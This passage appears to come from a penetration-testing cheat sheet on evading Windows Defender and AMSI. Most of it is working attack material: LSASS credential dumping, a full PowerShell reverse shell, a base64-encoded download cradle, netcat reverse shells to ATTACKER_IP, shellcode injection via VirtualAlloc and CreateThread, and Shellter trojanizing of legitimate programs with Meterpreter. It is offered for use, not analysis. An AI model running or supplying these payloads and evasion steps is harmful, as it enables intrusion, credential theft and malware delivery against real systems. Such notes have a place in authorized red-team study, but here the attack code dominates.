Invoke-EncodeAssembly -binaryPath winPEAS.exe -namespace winPEAS -capture $true
```

## Impacket

{% code overflow="wrap" fullWidth="true" %}
```bash
# lsassy, first compile DLL from https://github.com/outflanknl/Dumpert
lsassy -d north.sevenkingdoms.local -u jeor.mormont -p _L0ngCl@w_ 192.168.56.22 -m dumpertdll -O dumpertdll_path=/workspace/Outflank-Dumpert-DLL.dll
# psexec needs a custom file
psexec.py -file /x64/Release/MyPSexec.exe -hashes ':$LM_HASH' domain/user@$IP
```
{% endcode %}

## Enumeration

* We could (and should) always start with a little manual enumeration. This will be relatively quiet and gives us a baseline to work with
* Defender would definitely catch a regular copy of WinPEAS; however, it would be unlikely to catch either the `.bat` version or the obfuscated `.exe` version, both of which are released in the [PEAS repository](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/) alongside the regular version
* Chances are that AMSI will alert Defender if we try to load any PowerShell privesc check scripts (e.g. PowerUp), so we'd ideally be looking for obfuscated versions of these if we were to use them

```bash
#Look for Unquoted Service Paths on non-default services:
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
#Check if the service is running as LocalSystem
sc qc SERVICE_NAME
#Check permissions on the directory
powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
#After performing the exploit, delete our file and start the service again with sc

#To write a real Windows service (some modifications needed)
https://github.com/mattymcfatty/unquotedPoC
```

## Identify the AV installed

| [https://github.com/PwnDexter/SharpEDRChecker](https://github.com/PwnDexter/SharpEDRChecker) |
| -------------------------------------------------------------------------------------------- |
| [https://github.com/GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt)               |

Once we know the OS version and AV of the target, we would then attempt to replicate this environment in a virtual machine which we can use to test payloads against. Note that we should always disable any kind of cloud-based protection in the AV settings (potentially by outright disconnecting the VM from the internet) so that the AV doesn't upload our carefully crafted payloads to a server somewhere for analysis, destroying all our hard work. Once we have a working payload, we can then deploy it against the target!

## First steps

\- First of all try sth like this

{% code overflow="wrap" %}
```
curl -s --get 'http://10.10.0.0/webshell.php' --data-urlencode 'cmd=\\$LHOST\myshare\nc.exe $LHOST 443 -e cmd'
or sth like
\\$LHOST\myshare\nc.exe $LHOST 443 -e cmd
```
{% endcode %}

\- To see if the environment is restricted regarding some Powershell commands

```
powershell $ExectuionContext.SessionState.LanguageMode
# If the output is ConstrainedLanguage, it is limited
```

\- run `nc` out of an AppLocker safe directory

```
\windows\system32\spool\drivers\color\nc64.exe
```

## Shellter

```bash
#1 - DOWNLOAD A NORMAL 32-bits .EXE (WinRAR for example or putty/plink)
sudo apt install shellter

sudo shellter
Auto (A)
Absolute path
Stealth mode --> yes # try no if it does not work
List payloads
1 - Meterpreter reverse TCP
# ANOTHER OPTIONS IS TO CREATE OUR PAYLOAD WITH MSFVENOM , SELECT CUSTOM (C) 
# AND INDICATE THE PATH

# When you execute it on Windows --> reverse shell
# To avoid losing the shell when the program ends:
msf > use exploit/multi/handler
msf > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set AutoRunScript post/windows/manage/migrate
msf6 exploit(multi/handler) > exploit
```

## UPX

```bash
md5sum JuicyPotato.exe
upx -9 JuicyPotato.exe
mv JuicyPotato.exe PotatoUPX.exe
md5sum PotatoUPX.exe
# Now execute this .exe on the target
```

## Encoding to bypass

{% code overflow="wrap" fullWidth="true" %}
```powershell
cat rev.ps1

$socket = new-object System.Net.Sockets.TcpClient('10.10.14.2', 4444); #lhost lport
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do{
        $writer.Write("PS $(pwd)> ");
        $writer.Flush();
        $read = $null;
        while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $read);
        $sendback = (iex $data 2>&1 | Out-String );
        $sendback2  = $sendback;
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $writer.Write($sendbyte,0,$sendbyte.Length);
}While ($true);
$writer.close();$socket.close();

echo -n "iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10/rev.ps1')" | iconv -t  utf-16le | base64 -w0
aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgAvAHIAZQB2AC4AcABzADEAJwApAA==

cmd.exe /c powershell -enc aQBlAHgAIAAoAE4AZwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgAvAHIAZQB2AC4AcABzADEAJwApAA==
```
{% endcode %}

## Living Off The Land / AD

[#living-off-the-land-lolbas](./#living-off-the-land-lolbas "mention")

## Check against Windows Defender

A good way for checking against Windows Defender static detection is [https://github.com/rasta-mouse/ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

## Thread Injection

{% code overflow="wrap" fullWidth="true" %}
```bash
# In-memory payload injection script for PowerShell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$var2 = Add-Type -memberDefinition $code -Name "iWin32" -namespace Win32Functions -passthru;

[Byte[]];   
[Byte[]] $var1 = <place your shellcode here using msfvenom and the format is 0xfc,0xe8>

$size = 0x1000;

if ($var1.Length -gt 0x1000) {$size = $var1.Length};

$x = $var2::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($var1.Length-1);$i++) {$var2::memset([IntPtr]($x.ToInt32()+$i), $var1[$i], 1)};

$var2::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```
{% endcode %}

## Powershell script encoder

{% embed url="https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py" %}

## Other Netcat version

To not trigger the common ones available on Kali that Defender knows.

| [https://github.com/int0x33/nc.exe](https://github.com/int0x33/nc.exe) |
| ---------------------------------------------------------------------- |

## File transfers

Defender and AMSI protection - do not use PowerShell techniques.

Certutil is also flagged as malicious. Use curl instead.

```bash
curl http://ATTACKER_IP/nc.exe -o c:\\windows\\temp\\nc.exe

powershell.exe c:\\windows\\temp\\nc.exe ATTACKER_IP ATTACKER_PORT -e cmd.exe 
```

## File Splitting Technique

| [https://github.com/rzwck/pydsplit/blob/master/pydsplit.py](https://github.com/rzwck/pydsplit/blob/master/pydsplit.py) |
| ---------------------------------------------------------------------------------------------------------------------- |

## Encrypted SSL/TLS C++ Reverse Shell (HTTPS)

[https://github.com/V-i-x-x/SSL-AES-Reverse-Shell](https://github.com/V-i-x-x/SSL-AES-Reverse-Shell)

